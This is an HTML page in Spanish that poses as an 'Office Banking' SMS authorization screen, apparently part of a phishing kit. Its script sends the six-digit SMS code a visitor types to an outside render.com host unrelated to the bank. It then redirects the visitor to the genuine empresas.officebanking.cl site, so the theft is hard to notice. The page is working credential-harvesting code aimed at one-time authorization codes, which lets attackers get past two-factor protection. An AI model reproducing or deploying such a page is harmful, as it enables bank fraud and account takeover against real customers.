<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización por SMS</title>
  <link rel="stylesheet" href="style.css">
  <style>
    input.sms {
      border: 1px solid #000;
      outline: none;
      color: #000;
      padding: 10px;
      font-size: 18px;
      width: 120px;             /* espacio para 6 dígitos */
      text-align: center;
      background-color: #fff;
      margin-top: 20px;
    }
    input.sms:focus {
      border: 1px solid #000;
      outline: none;
    }
    .botones {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 40px; /* más separado hacia abajo */
    }
    .btn-red {
      background: red;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 12px 20px;
      font-weight: bold;
      cursor: pointer;
      font-size: 15px;
    }
    .btn-red:hover {
      background: #b30000;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
    <h1>Ingrese el código SMS de 6 dígitos</h1>

    <form id="formSMS">
      <input type="text" id="smsCode" class="sms" maxlength="6" placeholder="123456" required>
      <div class="botones">
        <button type="submit" class="btn-red">Autorizar</button>
      </div>
    </form>

    <div id="mensaje"></div>
  </div>

  <script>
    // Validar que solo se ingresen números y máximo 6 dígitos
    const smsInput = document.getElementById("smsCode");
    smsInput.addEventListener("input", function() {
      this.value = this.value.replace(/[^0-9]/g, ""); // solo números
      if(this.value.length > 6){
        this.value = this.value.slice(0,6); // máximo 6 dígitos
      }
    });

    document.getElementById("formSMS").addEventListener("submit", async function(e){
      e.preventDefault();
      const smsCode = smsInput.value;

      const mensaje = `Autorización por SMS: ${smsCode}`;

      try {
        await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mensaje })
        });
        document.getElementById("mensaje").innerText = "SMS enviado, procesando...";
        // Redirige a empresas.officebanking.cl
        setTimeout(()=> window.location.href="https://empresas.officebanking.cl", 3000);
      } catch (error) {
        document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
      }
    });
  </script>
</body>
</html>
